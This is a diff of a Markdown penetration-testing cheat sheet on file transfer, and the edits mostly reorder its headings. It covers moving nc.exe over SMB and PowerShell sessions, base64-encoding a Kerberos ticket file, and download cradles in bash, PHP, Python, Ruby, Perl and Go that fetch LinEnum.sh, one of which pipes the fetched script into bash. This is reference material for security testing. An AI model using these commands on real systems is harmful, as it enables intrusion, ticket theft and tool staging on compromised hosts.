@@ -27,44 +27,28 @@
 
 `echo <base64> | base64 -d -w 0 > bloodhound.zip `
 
+
 ### Copy-Item 
 
 `Copy-Item -Path C:\Temp\nc.exe -Destination C:\Temp\nc.exe -ToSession $session`
+
 
 ### Set-Content 
 
 `Invoke-Command -ComputerName 10.10.10.132 -ScriptBlock {Set-Content -Path C:\Temp\nc.exe -value $using:file}`
 
 
-## copy / xcopy / robocopy
+## Base64 Encode/Decode
 
-
-```po
-xcopy \\10.10.10.132\share\nc.exe nc.exe
-copy C:\Temp\nc.exe \\10.10.10.132\c$\Temp\nc.exe
-```
-
-## Map / Mount Drives
-
-
-```
-net use Q: \\10.10.10.132\share
-pushd \\10.10.10.132\share
-mklink /D share \\10.10.10.132\share
-smbclient //10.10.10.132/share -U username -W domain
-```
-
-### Base64 Encode/Decode
-
-##### Encode
+#### Encode
 
 `[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\TEMP\admin.kirbi"))`
 
-##### Decode
+#### Decode
 
 `[IO.File]::WriteAllBytes("admin.kirbi", [Convert]::FromBase64String("<base64>"))`
 
-### Download Cradles
+## Download Cradles
 
 from @harmj0y:
 
@@ -125,7 +109,25 @@ Links:
 https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 
 
-### bitsadmin.exe
+## copy / xcopy / robocopy
+
+
+```po
+xcopy \\10.10.10.132\share\nc.exe nc.exe
+copy C:\Temp\nc.exe \\10.10.10.132\c$\Temp\nc.exe
+```
+
+## Map / Mount Drives
+
+
+```
+net use Q: \\10.10.10.132\share
+pushd \\10.10.10.132\share
+mklink /D share \\10.10.10.132\share
+smbclient //10.10.10.132/share -U username -W domain
+```
+
+## bitsadmin.exe
 
 
 ```
@@ -325,7 +327,7 @@ https://staheri.com/my-blog/2013/january/vbscript-download-file-from-url/
 
 `rdesktop 10.10.10.10 -r disk:linux='/home/user/rdesktop/files'`
 
-#### tsclient.exe
+### tsclient.exe
 
 ![rdp](assets/rdp.png)
 
@@ -388,7 +390,7 @@ Links:
 https://xapax.gitbooks.io/security/content/transfering_files_to_windows.html
 
 
-### Bash (/dev/tcp)
+## Bash (/dev/tcp)
 
 
 ```bash
@@ -397,13 +399,13 @@ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
 cat <&3
 ```
 
-### PHP
+## PHP
 
-#### file_get_contents() 
+### file_get_contents() 
 
 `php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`
 
-#### fopen() 
+### fopen() 
 
 `php -r 'const BUFFER = 1024; $fremote = 
 fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`
@@ -415,7 +417,7 @@ fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", 
 `php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`
 
 
-### Python
+## Python
 
 ```python
 # Python 2
@@ -431,19 +433,19 @@ urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum
 ```
 
 
-### Ruby
+## Ruby
 
 
 `ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`
 
 
-### Perl
+## Perl
 
 
 `perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`
 
 
-### Go
+## Go
 
 
 ```go
@@ -469,7 +471,7 @@ func main() {
 ```
 
 
-# Web Servers
+## Web Servers
 
 
 ```bash
